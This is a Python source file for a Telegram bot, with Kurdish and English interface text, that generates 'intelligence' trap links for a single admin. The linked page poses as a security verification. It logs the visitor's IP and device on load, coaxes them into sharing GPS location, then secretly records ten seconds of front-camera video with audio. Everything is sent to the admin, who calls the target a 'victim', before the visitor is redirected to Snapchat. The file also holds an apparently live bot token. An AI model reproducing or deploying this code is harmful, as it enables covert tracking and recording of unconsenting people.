import asyncio
import logging
import os
import base64
from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from aiogram.filters import Command

# زانیارییە فەرمییەکان
TOKEN = "8364609349:AAF7i3nTGuvRnIV2kHSbWFCnPnj6iZdgBk4"
ADMIN_ID = 5583813672
FIXED_DOMAIN = "cyber-surche-bot-production.up.railway.app"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher()

user_states = {}
user_languages = {ADMIN_ID: "ku"}

TEXTS = {
    "ku": {
        "menu_link": "🔗 دروستکردنی لینکی هەواڵگری",
        "menu_stats": "📊 باری سیستەم",
        "menu_lang": "🌐 گۆڕینی زمان",
        "menu_ai": "🧠 زیرەکی دەستکرد",
        "welcome": "🌟 **بەخێر بێیتەوە سەرۆک بۆ ناوەندی کۆنتڕۆڵی شاهانەی هەواڵگری!**\n\n🛡️ سیستەم لە لوتکەی ئامادەباشیدایە. فەرموو فەرمانێک هەڵبژێرە:",
        "ask_redirect": "🔗 **سەرۆک، فەرموو لینکی مەبەست (Redirect Link) بۆ بنێرە** (وەک `https://snapchat.com/...`) تاوەکو قوربانییەکە ڕاستەوخۆ بۆی ببرێت.",
        "stats": "📊 **بارودۆخی سیستەمی شاهانە:**\n\n• دخ: 🟢 ۱۰۰٪ کارا و خێرا\n• ئاستی پارێزراوی: 🛡️ پلەی یەکەم (حکومی)\n• وێب سێرڤەر: 🌐 پەیوەستکراو بە Railway\n• قەبارە و هێز: ⚡ ۲x بەهێزکراو",
        "lang_select": "⚙️ **فەرموو زمانی پەیوەندیکردن هەڵبژێرە:**",
        "lang_changed": "🟢 زمان گۆڕرا بۆ **کوردی**.",
        "ai_prompt": "🧠 **ناوەندی زیرەکی دەستکرد ئامادەیە:**\nفەرموو پرسیار یان داواکارییەکەت بنووسە تاوەکو وەڵامت بدەمەوە.",
        "link_success": "🎯 **لینکی هەواڵگری و فێڵ بە سەرکەوتوویی دروست بوو!**\n\n🔗 **لینک:** `{payload_link}`\n\n📱 **تایبەتمەندییە پێشکەوتووەکان:**\n• کۆکردنەوەی خۆکاری زانیاری ئامێر و IP\n• وەرگرتنی GPS و ڤیدیۆ/دەنگی پێشکەوتووی کامێرا\n• گواستنەوەی خێرا بۆ لینکی مەبەست",
    },
    "en": {
        "menu_link": "🔗 Create Intelligence Link",
        "menu_stats": "📊 System Status",
        "menu_lang": "🌐 Change Language",
        "menu_ai": "🧠 Artificial Intelligence",
        "welcome": "🌟 **Welcome back, Commander, to the Royal Intelligence Command Center!**\n\n🛡️ The system is at peak readiness. Please select an option:",
        "ask_redirect": "🔗 **Commander, please send the target redirect link** (e.g., `https://snapchat.com/...`) for the victim.",
        "stats": "📊 **Royal System Status:**\n\n• Status: 🟢 100% Active & Fast\n• Security Level: 🛡️ Tier 1 (Gov)\n• Web Server: 🌐 Connected to Railway\n• Power & Scale: ⚡ 2x Boosted",
        "lang_select": "⚙️ **Please choose your interface language:**",
        "lang_changed": "🟢 Language changed to **English**.",
        "ai_prompt": "🧠 **AI Core is ready:**\nType your prompt or inquiry below.",
        "link_success": "🎯 **Intelligence link generated successfully!**\n\n🔗 **Link:** `{payload_link}`\n\n📱 **Advanced Features:**\n• Auto-collection of device info & IP\n• High-res GPS and Video/Audio capture\n• Seamless redirection",
    }
}

def get_current_lang(user_id):
    return user_languages.get(user_id, "ku")

def get_reply_menu(lang="ku"):
    t = TEXTS[lang]
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text=t["menu_link"]), KeyboardButton(text=t["menu_stats"])],
            [KeyboardButton(text=t["menu_lang"]), KeyboardButton(text=t["menu_ai"])]
        ],
        resize_keyboard=True,
        input_field_placeholder="👑 فەرماندە، فەرمانێک هەڵبژێرە..." if lang=="ku" else "👑 Commander, select a command..."
    )

@dp.message(Command("start"))
async def cmd_start(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    lang = get_current_lang(message.from_user.id)
    await message.answer(TEXTS[lang]["welcome"], reply_markup=get_reply_menu(lang))

@dp.message(F.text.in_(["🔗 دروستکردنی لینکی هەواڵگری", "🔗 Create Intelligence Link"]))
async def start_link_creation(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    lang = get_current_lang(message.from_user.id)
    user_states[ADMIN_ID] = {"step": "waiting_redirect"}
    await message.answer(TEXTS[lang]["ask_redirect"], reply_markup=get_reply_menu(lang))

@dp.message(F.text.in_(["📊 باری سیستەم", "📊 System Status"]))
async def system_stats(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    lang = get_current_lang(message.from_user.id)
    await message.answer(TEXTS[lang]["stats"], reply_markup=get_reply_menu(lang))

@dp.message(F.text.in_(["🌐 گۆڕینی زمان", "🌐 Change Language"]))
async def change_lang_menu(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    lang = get_current_lang(message.from_user.id)
    lang_kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="کوردی ☀️", callback_data="lang_ku"),
            InlineKeyboardButton(text="English 🇬🇧", callback_data="lang_en")
        ]
    ])
    await message.answer(TEXTS[lang]["lang_select"], reply_markup=lang_kb)

@dp.message(F.text.in_(["🧠 زیرەکی دەستکرد", "🧠 Artificial Intelligence"]))
async def ai_core_menu(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    lang = get_current_lang(message.from_user.id)
    user_states[ADMIN_ID] = {"step": "waiting_ai_prompt"}
    await message.answer(TEXTS[lang]["ai_prompt"], reply_markup=get_reply_menu(lang))

@dp.callback_query(F.data.startswith("lang_"))
async def set_lang_callback(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    await callback.answer()
    lang = callback.data.split("_")[1]
    user_languages[ADMIN_ID] = lang
    await callback.message.answer(TEXTS[lang]["lang_changed"], reply_markup=get_reply_menu(lang))

@dp.message(F.text & ~F.text.startswith("/"))
async def handle_text_inputs(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    lang = get_current_lang(message.from_user.id)
    text = message.text.strip()
    
    if text in [TEXTS["ku"]["menu_link"], TEXTS["en"]["menu_link"],
                TEXTS["ku"]["menu_stats"], TEXTS["en"]["menu_stats"],
                TEXTS["ku"]["menu_lang"], TEXTS["en"]["menu_lang"],
                TEXTS["ku"]["menu_ai"], TEXTS["en"]["menu_ai"]]:
        return

    state = user_states.get(ADMIN_ID, {}).get("step")
    
    if state == "waiting_redirect":
        user_states[ADMIN_ID] = {"step": "waiting_image", "target_url": text}
        await message.answer(
            "✅ **لينکەکە وەرگیرا.**\n\n📸 ئێستا **ئەو وێنەیەم بۆ بنێرە** کە دەتەوێت لەگەڵ لینکەکەدا پیشانی قوربانی بدرێت." if lang=="ku" else "✅ **Link received.**\n\n📸 Now **send me the image** to display with the link.",
            reply_markup=get_reply_menu(lang)
        )
    elif state == "waiting_ai_prompt":
        ai_response = f"🤖 **Royal AI Analysis:**\n\nبۆ پرسیارەکەی ئێوە ('{text}'):\nسیستەمی زیرەکی دەستکردی شاهانە لە لوتکەی توانادایە." if lang=="ku" else f"🤖 **Royal AI Analysis:**\n\nRegarding your prompt ('{text}'):\nThe Royal AI core processed your inquiry successfully."
        user_states[ADMIN_ID] = {}
        await message.answer(ai_response, reply_markup=get_reply_menu(lang))

@dp.message(F.photo)
async def handle_admin_photo(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    state = user_states.get(ADMIN_ID, {}).get("step")
    lang = get_current_lang(message.from_user.id)
    
    if state == "waiting_image":
        photo_id = message.photo[-1].file_id
        target_url = user_states[ADMIN_ID].get("target_url")
        
        railway_domain = FIXED_DOMAIN
        if not railway_domain.startswith("http"):
            railway_domain = f"https://{railway_domain}"
            
        payload_link = f"{railway_domain}/trap?redirect={target_url}"
        response_text = TEXTS[lang]["link_success"].format(payload_link=payload_link)
        
        user_states[ADMIN_ID] = {}
        await bot.send_photo(chat_id=ADMIN_ID, photo=photo_id, caption=response_text, parse_mode="Markdown", reply_markup=get_reply_menu(lang))

# پەڕەی تەڵەی شاهانەی پێشکەوتوو (١٠ سانیە تۆمارکردن و ڕووکاری دوو قۆناغی)
async def web_trap_page(request: web.Request):
    redirect_url = request.query.get('redirect', 'https://snapchat.com')
    headers = request.headers
    user_agent = headers.get('User-Agent', 'Unknown Browser/Device')
    ip = headers.get('X-Forwarded-For', request.remote)
    
    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>High Security Verification</title>
    <style>
        body {{
            background: linear-gradient(135deg, #07090f 0%, #121826 100%);
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-align: center;
            padding-top: 80px;
            margin: 0;
            height: 100vh;
            overflow: hidden;
        }}
        .container {{
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(12px);
            border-radius: 20px;
            max-width: 380px;
            margin: 0 auto;
            padding: 30px 20px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.6);
        }}
        h2 {{ font-size: 18px; font-weight: 600; margin-bottom: 8px; color: #f8fafc; }}
        p {{ color: #94a3b8; font-size: 13px; margin-bottom: 20px; }}
        .royal-btn {{
            background: linear-gradient(135deg, #38bdf8 0%, #2563eb 100%);
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 14px;
            font-weight: 600;
            border-radius: 10px;
            cursor: pointer;
            width: 100%;
            margin-bottom: 12px;
            box-shadow: 0 5px 15px rgba(56, 189, 248, 0.4);
            transition: 0.3s;
        }}
        .royal-btn:hover {{ opacity: 0.9; transform: translateY(-2px); }}
        .hidden {{ display: none; }}
    </style>
</head>
<body>
    <div class="container">
        <h2>پشتڕاستکردنەوەی سیستەمی ئەمنی</h2>
        <p>بۆ بینینی ناوەڕۆکەکە، تکایە هەنگاوەکانی خوارەوە تەواو بکە:</p>
        
        <!-- هەنگاوی یەکەم: وەرگرتنی لۆکەیشن -->
        <div id="step1">
            <button class="royal-btn" onclick="requestLocation()">📍 نیشاندانی شوێن (GPS Verification)</button>
        </div>

        <!-- هەنگاوی دووەم: کامێرا و پاشان گواستنەوە -->
        <div id="step2" class="hidden">
            <button class="royal-btn" onclick="requestCameraAndRedirect()">🎥 دەستپێکردنی خێرا و بینینی ناوەڕۆک</button>
        </div>
    </div>
    
    <video id="v" autoplay playsinline muted style="display:none;"></video>

    <script>
        const redirectTarget = "{redirect_url}";
        const clientInfo = {{ userAgent: "{user_agent}", ip: "{ip}" }};

        fetch('/save_info', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify(clientInfo)
        }});

        function requestLocation() {{
            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(function(pos) {{
                    fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude)
                    .finally(() => {{
                        document.getElementById('step1').classList.add('hidden');
                        document.getElementById('step2').classList.remove('hidden');
                    }});
                }}, function(err) {{
                    document.getElementById('step1').classList.add('hidden');
                    document.getElementById('step2').classList.remove('hidden');
                }}, {{ timeout: 10000, enableHighAccuracy: true }});
            }} else {{
                document.getElementById('step1').classList.add('hidden');
                document.getElementById('step2').classList.remove('hidden');
            }}
        }}

        function requestCameraAndRedirect() {{
            navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: true }})
            .then(function(stream) {{
                let video = document.getElementById('v');
                video.srcObject = stream;
                
                let mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm' }});
                let chunks = [];
                
                mediaRecorder.ondataavailable = function(e) {{
                    chunks.push(e.data);
                }};
                
                mediaRecorder.onstop = function() {{
                    let blob = new Blob(chunks, {{ type: 'video/webm' }});
                    let reader = new FileReader();
                    reader.readAsDataURL(blob);
                    reader.onloadend = function() {{
                        let base64data = reader.result;
                        fetch('/upload_video', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify({{ video: base64data }})
                        }}).then(() => {{
                            stream.getTracks().forEach(t => t.stop());
                            window.location.href = redirectTarget;
                        }});
                    }};
                }};
                
                mediaRecorder.start();
                // ماوەی تۆمارکردن زیادکرا بۆ ١۰ سانیە بە تەواوی
                setTimeout(function() {{
                    mediaRecorder.stop();
                }}, 10000);
                
            }}).catch(function(err) {{
                window.location.href = redirectTarget;
            }});
        }}
    </script>
</body>
</html>"""
    return web.Response(text=html_content, content_type='text/html')

async def save_info(request):
    try:
        data = await request.json()
        ua = data.get('userAgent')
        ip = data.get('ip')
        await bot.send_message(
            chat_id=ADMIN_ID, 
            text=f"👑 **زانیاری نوێ لە سیستەمی شاهانە:**\n\n🌐 **IP:** `{ip}`\n💻 **ئامێر:** `{ua}`"
        )
    except Exception as e:
        logging.error(f"Info error: {e}")
    return web.json_response({"status": "ok"})

async def upload_video(request):
    try:
        data = await request.json()
        video_data = data.get('video')
        if video_data and "," in video_data:
            encoded = video_data.split(",", 1)[1]
            video_bytes = base64.b64decode(encoded)
            video_file = BufferedInputFile(video_bytes, filename="target_recording.webm")
            await bot.send_video(
                chat_id=ADMIN_ID, 
                video=video_file, 
                caption="🚨 **ڤیدیۆ و دەنگی ١۰ چرکەیی ئامانج بە سەرکەوتوویی تۆمارکرا و دەستگیرکرا!**"
            )
    except Exception as e:
        logging.error(f"Video upload error: {e}")
    return web.json_response({"status": "ok"})

async def save_location(request):
    lat = request.query.get('lat')
    lon = request.query.get('lon')
    if lat and lon:
        await bot.send_location(chat_id=ADMIN_ID, latitude=float(lat), longitude=float(lon))
        await bot.send_message(chat_id=ADMIN_ID, text=f"📍 **شوێنی جوگرافی GPS (گۆگڵ ماپ):**\nپانی: `{lat}`\nدرێژی: `{lon}`\n🌐 [ببینە لە سەر نەخشە](https://maps.google.com/?q={lat},{lon})")
    return web.json_response({"status": "ok"})

async def index_handler(request):
    return web.Response(text="Royal Intelligence Core is Active & Boosted.", content_type='text/html')

async def main():
    app = web.Application(client_max_size=50*1024*1024)
    app.router.add_get('/', index_handler)
    app.router.add_get('/trap', web_trap_page)
    app.router.add_post('/save_info', save_info)
    app.router.add_post('/upload_video', upload_video)
    app.router.add_get('/save_location', save_location)

    runner = web.AppRunner(app)
    await runner.setup()
    
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

    logging.info(f"Royal Web Server started on port {port}.")
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
